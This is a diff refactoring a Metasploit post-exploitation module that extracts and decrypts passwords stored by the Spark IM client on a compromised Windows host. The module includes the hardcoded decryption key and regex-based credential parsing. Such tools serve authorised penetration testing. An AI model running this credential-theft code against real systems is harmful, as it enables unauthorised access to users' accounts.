@@ -1,36 +1,44 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
 require 'openssl'
 
-class Metasploit3 < Msf::Post
-
+class MetasploitModule < Msf::Post
   include Msf::Post::Windows::UserProfiles
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => 'Windows Gather Spark IM Password Extraction',
-      'Description'    => %q{
-            This module will enumerate passwords stored by the Spark IM client.
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Gather Spark IM Password Extraction',
+        'Description' => %q{
+          This module will enumerate passwords stored by the Spark IM client.
           The encryption key is publicly known. This module will not only extract encrypted
           password but will also decrypt password using public key.
         },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
+        'License' => MSF_LICENSE,
+        'Author' => [
           'Brandon McCann "zeknox" <bmccann[at]accuvant.com>',
           'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>'
         ],
-      'SessionTypes'   => [ 'meterpreter' ],
-      'References'     =>
-        [
+        'SessionTypes' => [ 'meterpreter' ],
+        'References' => [
           [ 'URL', 'http://adamcaudill.com/2012/07/27/decrypting-spark-saved-passwords/']
-        ]
-    ))
+        ],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              core_channel_eof
+              core_channel_open
+              core_channel_read
+              core_channel_write
+            ]
+          }
+        }
+      )
+    )
   end
 
   # decrypt spark password
@@ -39,7 +47,7 @@ class Metasploit3 < Msf::Post
     encrypted = hash.unpack("m")[0]
     key = "ugfpV1dMC5jyJtqwVAfTpHkxqJ0+E0ae".unpack("m")[0]
 
-    cipher = OpenSSL::Cipher::Cipher.new 'des-ede3'
+    cipher = OpenSSL::Cipher.new 'des-ede3'
     cipher.decrypt
     cipher.key = key
 
@@ -108,6 +116,7 @@ class Metasploit3 < Msf::Post
         # open the file for reading
         config = client.fs.file.new(accounts, 'r') rescue nil
         next if config.nil?
+
         print_status("Config found for user #{user['UserName']}")
 
         # read the contents of file
@@ -124,8 +133,8 @@ class Metasploit3 < Msf::Post
         end
 
         # store the hash close the file
-        password = password.delete_if {|e| e !~ /password.+=.+=\r/}
-        password.each do | pass |
+        password = password.delete_if { |e| e !~ /password.+=.+=\r/ }
+        password.each do |pass|
           if pass.nil?
             next
           end
